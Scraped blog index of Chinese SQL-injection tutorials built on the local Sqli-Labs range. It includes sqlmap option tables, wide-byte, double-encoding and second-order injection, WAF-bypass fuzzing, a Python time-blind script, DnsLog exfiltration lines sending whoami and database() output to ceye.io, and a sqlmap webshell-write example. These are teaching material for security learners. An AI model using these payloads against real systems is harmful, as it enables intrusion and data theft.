File System Access（访问文件系统）这些选项可用于访问后端数据库管理系统的文件系统。 参数 解释 –file-read=RFILE 读取目标站点的文件。例如--file-read=&quot;/etc/password&quot; –file-write=WFILE 写入目标站点的文件（通常与–sql-query联合使用，使用相对路径）。例如--sql-query=&quot;select &quot;一句话木马&quot; --file-write=&quot;shell.php&quot; –file-dest=DFILE 同上。使用绝对路径。 3.13 Operating System Access（操作系统连接）这些选项可用于访问底层操作系统的后端数据库管理系统。 参数 解释 –os-cmd=OSCMD 执行系统命令。例如--os-shell=&quot;ipconfig -all&quot; –os-shell 执行远程系统命令（在目标站点操作系统上的Shell） –os-pwn 同上。获取一个OOB shell、meterpreter、VNC。 –os-smbrelay 同上。一键获取获取一个OOB shell、meterpreter、VNC。 –os-bof 利用缓冲区溢出。 –priv-esc 自动提权。 –msf-path=MSFPATH 查看Metasploit Framework本地的安装路径。 –tmp-path=TMPPATH 远程临时文件目录的绝对路径 3.14 Windows Registry Access（Windows注册表连接）这些选项可用于访问后端数据库管理系统的Windows注册表。 参数 解释 –reg-read 读取一个Windows注册表 –reg-add 添加一个Windows注册表 –reg-del 删除一个Windows注册表 –reg-key=REGKEY 与–reg-add连用，注册表key值 –reg-value=REGVAL 与–reg-add连用，注册表值 –reg-data=REGDATA 与–reg-add连用，注册表数据 –reg-type=REGTYPE 与–reg-add连用，注册表类别 3.15 General（通用）这些选项可用于设置一些常规的测试参数。 参数 解释 -s SESSIONFILE 从一个文件加载保存的session -t TRAFFICFILE 记录流文件的保存位置 –batch 批处理。在检测过程中有一些咨询问题，使用默认值答复。 –binary-fields=.. 指定二进制结果的字段 –check-internet 在评估目标之前检查互联网连接 –crawl=CRAWLDEPTH 初始位置爬虫的深度。例如--crawl=3 –crawl-exclude=.. 全部页面爬取除了…。例如--crawl-exclude=&quot;test.com/logout.php&quot; –csv-del=CSVDEL 指定在CSV输出中使用的分隔字符 –charset=CHARSET 强制字符串编码。例如--charset=gbk –dump-format=DU.. 转存数据的格式。（默认CSV、HTML、SQLITE三种格式） –encoding=ENCOD.. 用于数据检索的字符编码。 –eta 显示每个输出的预计到达时间 –flush-session 清空会话信息 –forms 在目标URL上解析和测试表单 –fresh-queries SQLMAP每次将查询结果存在.sqlmap文件夹中，若下次有相同的查询则直接调用上次的结果。使用这个参数忽略之前查询结果 –har=HARFILE 将HTTP流量记录在一个HAR文件 –hex DUMP非ASCII字符时，将其编码为16进制，收到后解码环境。 –output-dir=OUT.. 输出结果至文件。例如--ouput-dir=/tmp –parse-errors 解析并显示报错文件 –save=SAVECONFIG 过滤信息 –scope=SCOPE –test-filter=TE.. –test-skip=TEST.. –update 检查更新SQLMAP 3.16 Miscellaneous（杂项）这些选项可用于不适合上述任何类别的一些杂项。 参数 解释 -z MNEMONICS 参数助记符，类似于alias。例如-z &quot;abc&quot; –alert=ALERT 找到SQL注入时运行主机OS命令。 –answers=ANSWERS 设置问题答案。在--batch选择的是默认值，可以使用参数对特定问题设定特定答案。例如--answer &quot;extending=N&quot;。 –beep 在SQL注入被发现时发出嘟嘟声。 –cleanup 从SQLMAP特定的UDF和表中找数据库。（暴力破解） –dependencies 检查缺少的SQL映射依赖项。 –disable-coloring 禁止输出着色。 –gpage=GOOGLEPAGE –identify-waf 识别目标的WAF机制 –mobile 模拟手机 –offline 离线运行 –purge-output 删除所有保存的数据文件夹 –skip-waf 跳过WAF/IPS/IDS保护的启发式检测 –smart 当有大量检测目标时，只选择基于错误的检测 –sqlmap-shell 打开交互式的SQLMAP-Shell –tmp-dir=TMPDIR 更改临时存储文件的本地目录 –web-root=WEBROOT 设置Web服务器文档根目录。例如--web-root=&quot;/var/www&quot; –wizard 新手教程（挺有趣）","categories":[{"name":"工具说明书","slug":"工具说明书","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E%E4%B9%A6/"}],"tags":[{"name":"SQLMAP","slug":"SQLMAP","permalink":"http://example.com/tags/SQLMAP/"}]},{"title":"测试","slug":"测试","date":"2020-03-30T09:35:25.000Z","updated":"2020-04-07T08:11:24.000Z","comments":true,"path":"2020/03/30/测试/","link":"","permalink":"http://example.com/2020/03/30/%E6%B5%8B%E8%AF%95/","excerpt":"","text":"包括音乐框、建站时长、阅读时长。。。。懒得写qwq","categories":[{"name":"测试","slug":"测试","permalink":"http://example.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"测试","slug":"测试","permalink":"http://example.com/tags/%E6%B5%8B%E8%AF%95/"}]},{"title":"【Web安全】四、SQL注入防御绕过","slug":"【Web安全】四、SQL注入防御绕过","date":"2020-03-28T09:35:25.000Z","updated":"2020-04-07T07:58:48.000Z","comments":true,"path":"2020/03/28/【Web安全】四、SQL注入防御绕过/","link":"","permalink":"http://example.com/2020/03/28/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87/","excerpt":"本文学习如何绕过开发者对SQL注入设置的防御机制，主要是通过宽字节、二次编码、二次注入、绕过WAF等方法来突破防御机制。从每种方法的原理、方法讲解，到利用Sqli-Labs模拟环境来实战。","text":"本文学习如何绕过开发者对SQL注入设置的防御机制，主要是通过宽字节、二次编码、二次注入、绕过WAF等方法来突破防御机制。从每种方法的原理、方法讲解，到利用Sqli-Labs模拟环境来实战。 一、宽字节注入1.1宽字节注入原理 宽字节：两个字节 例如 GBK、GB2312。（uft-8不是宽字节） 安全防御者为了应对SQL注入，因此在*前面加入\\使其转义。 1.2宽字节注入方法在注入点后键入%df，然后按照正常的注入流程开始注入。 黑盒测试： 在可能的注入点后键入%df，之后进行注入测试 白盒测试： 查看MySQL编码是否为GBK 是否使用preg_replace()把单引号替换成\\&#39; 是否使用addslashes进行转义 是否使用mysql_real_escape_string进行转义 1.3实战 SQLi-Labs Less-32 白盒测试第二点查看Less-32源码 测试注入点 Payload: http://127.0.0.1:8999/Less-32/?id=1%df&#39; 判断数据表列数 Payload: http://127.0.0.1:8999/Less-32/?id=1%df&#39; order by 4–+ union注入测试 Payload: http://127.0.0.1:8999/Less-32/?id=-1%df&#39; union select 2,3,4–+ 查询数据库SECURITY中的数据表 Payload: http://127.0.0.1:8999/Less-32/?id=-1%df&#39; union select 2,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),4–+ 1.4实战 SQLi-Labs Less-33 白盒测试第三点查看源代码 addslashes() 函数返回在预定义的字符（&#39;、&quot;、\\和NULL）前添加反斜杠的字符串。 1.5 宽字节防御 使用UTF-8，避免宽字节注入（韩文、日语都是宽字节，都可能存在宽字节注入） mysql_real_escape_string（设置mysql_set_charset(‘gbk’,$conn);） 设置MySQL的连接参数（character_set_client=binary） 二、二次编码注入2.1二次编码注入原理urldecode()与PHP本身处理编码时，两者配合失误，可构造数据消灭\\。 2.2二次编码注入方法在注入点后键入%2527，然后按照正常的注入流程开始注入。 黑盒测试： 在可能的注入点后键入%2527，之后进行注入测试 白盒测试： 是否使用urldecode()函数 urldecode()函数是否在转义方法之后使用 2.3实战 SQLi-Labs Less-0SQLi-Labs内无此类型的题目，因此自行构造Less-0 123456789101112131415161718192021222324252627282930313233343536&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=mysql_real_escape_string($_GET[&#x27;id&#x27;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;echo &#x27;mysql_real_escape_string:&#x27;.$id.&quot;&lt;br /&gt;&quot;;//logging the connection parameters to a file for analysis.$id = urldecode($id);echo &#x27;urldecode:&#x27;.$id.&#x27;&lt;br /&gt;&#x27;;// connectivity$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; 正常输入–&gt;不能够进行注入 Payload: http:127.0.0.1:8999/Less-0/?id=1’ 构造二次编码环境 Payload: http:127.0.0.1:8999/Less-0/?id=1%2527 判断数据表列数 Payload: http:127.0.0.1:8999/Less-0/?id=1%2527 order by 4–+ union注入测试 Payload: http:127.0.0.1:8999/Less-0/?id=-1%2527 union select 1,2,3–+ 查询数据库SECURITY中的数据表 Payload: http:127.0.0.1:8999/Less-0/?id=-1%2527 union select 2,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),4–+ 三、二次注入3.1二次注入原理第一步：插入恶意数据 在第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容。 第二步：引用恶意数据 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下次需要进行查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验和处理，这就造成了SQL的二次注入。 3.2二次注入方法3.3实战 SQLi-Labs Less-24插入新用户（账号为admin&#39;# 密码为123） 分析logged-in.php和pass_change.php源代码 修改刚才创建的admin&#39;#的密码 可以发现并不是修改了账号为admin &#39;#的密码，而是修改了账号为admin的密码。这其中就存在着二次注入漏洞。 分析漏洞 查看pass_change.php源代码，并将上述账号密码带入。 则程序最终会执行： $sql = &quot;UPDATE users SET PASSWORD=&#39;1&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;; （#执行单条语句注释） 根据#注释之后，程序会执行 $sql = &quot;UPDATE users SET PASSWORD=&#39;1&#39; where username=&#39;admin&#39;&quot;； 3.4实战 SQLi-Labs Less-24 (改编) 设置数据表users中的username字段为VARCHAR(255) 使得username的长度为0-255之间 ALTER TABLE users CHANGE username username VARCHAR(255) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL; 创建userlist.php文件中 1234567891011121314151617181920212223242526#php部分代码&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);$sql=&quot;SELECT * FROM users ORDER BY id asc&quot;;$result= mysql_query($sql);$num = mysql_num_rows($result);for ($j = 0; $j = $num ; ++j)( $row = mysql_fetch_array($result); $username = $row[1]; $sql_detail = &quot;SELECT * FROM users where username=&#x27;$username&#x27;&quot;; $result_detail = mysql_query($sql_detail); $num_detail = mysql_num_rows($result_detail); for ($i = 0 ; $i = $num_detail ; ++$i))( $row_detail = mysql_fetch_array($result_detail); echo &lt;&lt;&lt;END &lt;table border=&quot;1&quot; style=&quot;table-layout;fixed;&quot; width=&quot;1000&quot;&gt; &lt;tr&gt; &lt;th&gt;$row_detail[1]&lt;/th&gt; &lt;th&gt;$row_detail[2]&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; END; ))&gt; 创建账号为1’ union select 1,user(),3# 密码随意 查看数据库users内容，可以看到1’ union select 1,user()被SQL执行器执行了。 分析漏洞 查看userlist.php源代码，并将上述账号密码带入。 $sql_detail=&quot;SELECT * FROM users where username=&#39;$username&#39;&quot; 带入username=1’ union select 1,user(),3# $sql_detail=&quot;SELECT * FROM users where username=&#39;1&#39; union select 1,user(),3#&#39;&quot; 由于前半句查询结果为空，因此执行union，返回user()。 利用漏洞查询信息 设置账号为1’ union select 1,(select concat_ws(0x7e,username,password) from security.users limit 0,1),3# 3.5 二次注入防御对外部提交的数据，需要更加谨慎的对待。 程序内部的数据调用，也要严格的进行检查，一旦不小心，攻击者就能将特定SQL语句带入到查询当中。 四、WAF（Web Application Firewell）绕过原理 熟练掌握MySQL函数和语法使用方法 深入了解中间件运行处理机制 了解WAF防护原理及方法 4.1 WAF绕过原理-白盒绕过 分析代码：使用了blacklist()函数过滤or和AND，i指的是忽略大小写 绕过限制：1. 大小写变形Or、OR、oR 2. 等价替换 and–&gt;&amp;&amp;以及or–&gt;|| 3. 诸如OorR之类绕过。 4.2 WAF绕过原理-黑盒绕过 架构层绕过WAF 寻找源站-&gt;针对云WAF 利用同网段-&gt;绕过WAF防护区域 利用边界漏洞-&gt;绕过WAF防护区域 ssrf漏洞 资源限制角度绕过WAF POST大BODY（发送很大的数据包） 协议层面绕过WAF 协议未覆盖绕过WAF(请求方式变换 GET-&gt;POST；Content-Type变换：application/x-www-form-urlencoded-&gt;multipart/form-data;.) 参数污染index.php?id=1&amp;id=2(SQL注入) 规则层面的绕过（%25-&gt;%） 4.3 Fuzz绕过WAF以注释绕过为例子，开始Fuzz 注释符绕过 union/*something*/select 先测试最基本的： union/**/select 再测试中间引入特殊字： union/*aaaa%01bbs*/select 最后测试注释长度： union/*aaaaaaaaaaaaaaaaaaaaaaa*/select 构造Payload：http://127.0.0.1:8999/Less-1/?id=1&#39; and ‘1’=’1 通过BurpSuite的Intruder暴力破解WAF规则 将空格 替换为 /*%!%2f*/ 以及特殊函数 xx() -&gt; xx/*%!%2f*/() 示例Payload: http:127.0.0.1:8999/Less-0/?id=&#39;/*%!%2f*/union/*%!%2f*/select/*%!%2f*/2,(select/*%!%2f*/table_name/*%!%2f*/from/*%!%2f*/information_schema.tables/*%!%2f*/where/*%!%2f*/table_schema=0x7365637572697479/*%!%2f*/limit/*%!%2f*/0,1),4--+ 五、SqlMapWaf绕过脚本编写5.1 SQLMAP介绍SQLMAP下载地址：http://sqlmap.org/ 查看SQLMAP是否安装 python3 sqlmap.py -h 5.2 SQLMAP常用注入测试语句测试1： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; 查询SQL注入点 测试2： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --current-db 查询当前数据库 测试3： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --current-user 查询当前用户 测试4： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --dbs 该测试服务器所有数据库的名称 测试5： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; -D security --tables 测试6： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; -D security -T users --columns 测试7： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; -D security -T users -C username,passsword --dump 测试8： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --os-shell 测试9： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --sql-shell 交互式SQL界面 测试10： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --file-read=‘var/www/a.php’ 测试11： python3 sqlmap.py -u &quot;http://127.0.0.1:8999/Less-1/?id=1&quot; --file-write 本地文件 --file-dest 目标文件 5.3 SQLMAP Tamper 脚本介绍SQLMAP目录下Tamper文件夹中的一些脚本： 5.4 SQLMAP Tamper 脚本编写以base64encode.py为例子查阅如何编写脚本 12345678910111213141516171819202122232425262728# 头部声明#!/usr/bin/env python# 注释声明&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file &#x27;LICENSE&#x27; for copying permission&quot;&quot;&quot;# 调用可能所需的第三方库和SQLMAP内部调用from lib.core.convert import encodeBase64from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): pass# 改变Payload的代码函数 def tamper(payload, **kwargs): &quot;&quot;&quot; Base64-encodes all characters in a given payload &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;) &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27; &quot;&quot;&quot; return encodeBase64(payload, binary=False) if payload else payload 编写脚本：sqli-lab28.py 123456789101112131415161718192021#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file &#x27;LICENSE&#x27; for copying permission&quot;&quot;&quot;from lib.core.convert import encodeBase64from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): &quot;&quot;&quot; Bypass SQLi-Labs/Less-28 &quot;&quot;&quot; if payload: payload = payload.replace(&#x27;union select&#x27;,&#x27;union all select&#x27;).replace(&#x27; &#x27;,&#x27;%0a&#x27;) return payload 5.5实战 SQLi-Labs Less-28（分析Fuzz方法）查看源代码，可以发现blacklist()函数将/ * - # space &#123;union +select&#125; 过滤。 调用5.4编写的sqli-labs.py脚本 SQLMAP语句：python3 sqlmap -u &quot;http://127.0.0.1:8999/Less-28/?id=1&quot; --flush-session --tamper=sqli-labs28.py","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"盲注","slug":"盲注","permalink":"http://example.com/tags/%E7%9B%B2%E6%B3%A8/"}]},{"title":"【Web安全】三、SQL盲注","slug":"【Web安全】三、SQL盲注","date":"2020-03-25T04:56:25.000Z","updated":"2020-04-03T07:19:48.000Z","comments":true,"path":"2020/03/25/【Web安全】三、SQL盲注/","link":"","permalink":"http://example.com/2020/03/25/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%B8%89%E3%80%81SQL%E7%9B%B2%E6%B3%A8/","excerpt":"本文学习SQL盲注，通过掌握布尔盲注、时间延迟盲注和DnsLog盲注三种盲注方法的原理，到利用Sqli-Labs模拟环境来实战。","text":"本文学习SQL盲注，通过掌握布尔盲注、时间延迟盲注和DnsLog盲注三种盲注方法的原理，到利用Sqli-Labs模拟环境来实战。 一、布尔盲注布尔盲注原理 可以进行注入，但是不回显数据，只返回True与False。 布尔盲注典型代码123456789$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; limit 0,1&quot;;$result = mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;True!!!&quot;;&#125;else&#123; echo &quot;Fasle!!!&quot;;&#125; 布尔盲注方法构造逻辑判断语句，判断信息真假 序号 方法 说明 1 left()函数 left(str1,length) 从左侧截取str的前b位 2 regexp select user() regexp &#39;^r&#39; regexp为匹配root的正则表达式 3 like select user() like &#39;ro%&#39; 使用like进行匹配 4 substr()函数和ascii()函数 ascii(substr((select database(),1,1))=98 substr(str,index,length) 5 ord()函数和mid()函数 ord(mid((select user()),1,1))=114 mid(str,index,length) 注： 在BurpSuite中可以使用intuder模块根据返回页面长度不同来判断。（利用BurpSuite工具将在后续文章中详解） 实战 SQLi-Labs Less-8 阅读源代码可知语句为True则返回You are in ......，False则不返回内容。 利用left()函数来测试数据库名称 利用left()函数来查询数据表名称 利用regexp正则表达式来查询数据库名称 利用substr()和ascii()函数来查询数据库名称 二、时间盲入时间盲注原理 代码存在SQL注入漏洞，但是页面不会回显错误信息 语句执行后也不回显真假信息，不能通过页面的内容来判断 时间盲注：构造语句，通过页面响应的时长来判断信息 时间盲注代码123456789$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; limit 0,1&quot;;$result = mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;&quot;;&#125;else&#123; echo &quot;&quot;;&#125; 时间盲注方法构造逻辑语句，通过条件语句进行判断，True则立即执行，False则延时执行。 核心语法：**if(条件,0,sleep(3));** 真实场景：if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))--+ 实战 SQLi-Labs Less-10 阅读源代码可知语句无论是True还是False都返回You are in ......。 构造Payload实现时间盲注http://127.0.0.1:8999/Less-10/?id=2“ and if(left(user(),1)= ’a’,0,sleep(3))--+，通过响应时长来判断。 构造Payload实现时间盲注http://127.0.0.1:8999/Less-10/?id=2“ and if(left(user(),1)= ’r’,0,sleep(3))--+（正确答案），通过响应时长来判断。 用Python3编写时间盲注脚本123456789101112131415161718192021222324252627282930313233343536373839# timeBlindSql.pyimport requestsimport timeimport binascii#提供字符串转十六进制函数#def strtoHex():# temp = str(binascii.b2a_hex(&#x27;security&#x27;.encode(&#x27;utf-8&#x27;)))# return &#x27;0x&#x27;+temp[2:len(temp)-1]url = &#x27;http://127.0.0.1:8999/Less-10/?id=1&#x27;# 获取数据库，不需做任何改动database = &#x27;select schema_name from information_schema.schemata&#x27;# 获取数据表，默认为当前数据库，若需改动则填写数据库的十六进制格式table = &#x27;select table_name from information_schema.tables where table_schema=database()&#x27; # 获取数据表，数据表的十六进制格式column = &#x27;select column_name from information_schema.columns where table_name=&quot;table_name&quot;&#x27;result = &#x27;&#x27;result_total = &#x27;&#x27;for num in range(0,5): for i in range(1,20): for j in range(48,122): payload = &#x27;&quot; and if(ascii(substr((&#123;&#125; limit &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(1),1)--+&#x27;.format(table,num,i,j) stime = time.time() r = requests.get(url+payload) etime = time.time() if etime - stime &gt;= 1: result += chr(j) break print(&#x27;result[&#123;&#125;]:&#x27;.format(num)+result) result_total += &#x27;&#123;&#125; &#x27;.format(result) result = &#x27;&#x27;print(result_total) 三、Dnslog盲注Dnslog盲注原理 DnsLog：DNS Server中记录我们访问域名的信息。 语句执行后也不回显真假信息，不能通过页面的内容来判断。我们可以通过布尔或时间盲注来获取内容，但是整个过程效率很低，需要发送很多的请求进行判断，很可能会触发安全设备的防护。 DnsLog盲注：减少请求，直接回显数据。 Dnslog盲注典型代码123456789$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; limit 0,1&quot;;$result = mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;True!!!&quot;;&#125;else&#123; echo &quot;Fasle!!!&quot;;&#125; Dnslog盲注方法DnsLog平台：http://ceye.io/ 前往DnsLog平台注册登入后，平台会分配一个Identity 进入命令行利用curl发起请求 在ceye.io/records/dns即可查看到访问记录 利用bash中``可执行命令的属性。设置curl请求：`whoami`.bygt3w.ceye.io DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息。 在MySQ LLOAD_FILE函数可以发起请求，使用DnsLog接收请求，获取数据。 核心语句：SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,（select database()),&#39;.mysql.bygt3w.ceye.io\\\\abc&#39;)) 通过SQL语句查询内容，作为请求的一部分，发送至DnsLog。 只需要对核心语句中select database()部分进行构造，就能实现有回显的SQL注入。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"盲注","slug":"盲注","permalink":"http://example.com/tags/%E7%9B%B2%E6%B3%A8/"}]},{"title":"【Web安全】二、SQL注入语法类型","slug":"【Web安全】二、SQL注入语法类型","date":"2020-03-22T13:26:25.000Z","updated":"2020-04-03T07:20:00.000Z","comments":true,"path":"2020/03/22/【Web安全】二、SQL注入语法类型/","link":"","permalink":"http://example.com/2020/03/22/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E7%B1%BB%E5%9E%8B/","excerpt":"本文学习SQL注入语法类型，主要介绍了两种注入语法，分别是UNION联合查询注入和报错注入，每一部分都会涉及到Sqli-Labs模拟实战环境。","text":"本文学习SQL注入语法类型，主要介绍了两种注入语法，分别是UNION联合查询注入和报错注入，每一部分都会涉及到Sqli-Labs模拟实战环境。 一、UNION查询注入1.1 UNION介绍 UNION操作符用于合并两个或多个SELECT语句的结果集。 注意：要与UNION前面的select语句拥有相同数量的列。 1.2 UNION注入应用场景 只有最有一个select子句允许有order by 只有最有一个select子句允许有limit 查询字段数一样 注入点页面有回显 1.3 UNION注入过程 order by确定列数 因此可以确认该user表共有三列，便于后续union查询操作。 观察页面返回， 选取可以显示数据的位置，进行下一步的注入 读库信息（详细解析请看第一章）1http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 读表信息（详细解析请看第一章）1http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from%20information_schema.tables where table_schema&#x3D;&#39;security&#39;)--+ 读列信息（详细解析请看第一章）1http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)--+ 读数据信息（详细解析请看第一章）123http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(username) from security.users)--+# 或者http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(username) from users--+ 二、报错注入 2.1 报错注入原理 构造Payload让信息通过错误提示回显出来 应用场景： 查询不回显内容，会打印错误信息 UPDATE、INSRET等语句，会打印错误信息 12345if($row)&#123; echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];&#125;else&#123; print_r(mysql_error());&#125; 2.2 报错注入实战 函数 举例（公式） floor() select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)) 对rand()函数进行操作时产生错误 extractvalue() extactvalue(1,concat(0x7e,(select user()),0x7e))对XPATH语法错误产生报错 updatexml() select updatexml(1,concat(ox7e,(select user()),ox7e),1)对XPATH语法错误产生报错 floor()报错注入方法 Payload:*select count(\\) from information_schema.tables group by concat(**需要的回显信息),floor(rand(0)*2)) extractvalue()报错注入方法 Payload:*select extactvalue(1,concat(0x7e,(\\需要的回显信息*\\),0x7e)) updatexml()报错注入方法 Payload:*select updatexml(1,concat(0x7e,(\\需要的回显信息*\\),0x7e),1) 注意：updatexml()返回的数据长度不超过32，因此使用substr(str,index,length)进行截取就可。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"语法","slug":"语法","permalink":"http://example.com/tags/%E8%AF%AD%E6%B3%95/"}]},{"title":"【Web安全】一、SQL注入基础","slug":"【Web安全】一、SQL注入基础","date":"2020-03-18T16:46:25.000Z","updated":"2020-04-07T08:01:15.000Z","comments":true,"path":"2020/03/19/【Web安全】一、SQL注入基础/","link":"","permalink":"http://example.com/2020/03/19/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%B8%80%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"本文学习SQL注入前的一些必备基础知识，包括了解Web应用框架、搭建后续学习所需的Sqli-Lab模拟靶场、解析SQL注入原理、学习MySQL基础知识（尤为重要的information_schema数据库）和熟悉SQL注入流程，最终使用手工注入方式解决Sqli-Labs/Less-1关卡。","text":"本文学习SQL注入前的一些必备基础知识，包括了解Web应用框架、搭建后续学习所需的Sqli-Lab模拟靶场、解析SQL注入原理、学习MySQL基础知识（尤为重要的information_schema数据库）和熟悉SQL注入流程，最终使用手工注入方式解决Sqli-Labs/Less-1关卡。 前言随着Web2.0、社交网络、微博等等一系列新型的互联网产品的诞生，基于Web环境的互联网应用越来越广泛，企业信息化的过程中各种应用都架设在Web平台上，Web业务的迅速发展也引起黑客们的强烈关注，接踵而至的就是Web安全威胁的凸显，黑客利用网站操作系统的漏洞和Web服务程序的SQL注入漏洞等得到Web服务器的控制权限，轻则篡改网页内容，重则窃取重要内部数据，更为严重的则是在网页中植入恶意代码，使得网站访问者受到侵害。 【Web安全】作为一个系列会在本博客连载，大体上从SQL注入、文件上传漏洞、XSS漏洞、代码审计、PHPThink、Python安全编程等方面来解开漏洞的真面目，以及组建模拟环境来训练。 一、WEB应用框架分析Web应用老框架 Web应用新框架 二、SQL注入环境搭建使用Docker搭建Sqli-labs靶场。（略） 三、SQL注入原理 SQL全称结构化查询语言StructuredQueryLanguage，其功能包括查询、操纵、定义和控制四个方面，是一个通用的功能机枪的关系数据库标准语言。 在B/S模式中，开发者在编写代码时没有对用户的输入数据或者是页面中所携带的信息进行必要的合法性判断。攻击者利用这个机会提交一段数据库查询代码，根据程序返回的结果，就可以获得一些数据库信息。 访问网站查询数据的流程 例如对代码进行拼接 http://127.0.0.1:8999/Less-1/?id=1 union select 1,version(),3%23 在查询id=1的同时也可以查看数据库的系统版本。注：%23 -&gt; # 四、MySQL内置函数主要说明一下SQL注入过程中常用函数。 1234567#部分函数使用说明Concat(‘str1’,’str2’)Concat_ws(‘:’,’str1’,’str2’)Group_concat(‘sr1’,’str2’,’str3’...)Select ‘words’ into outfile 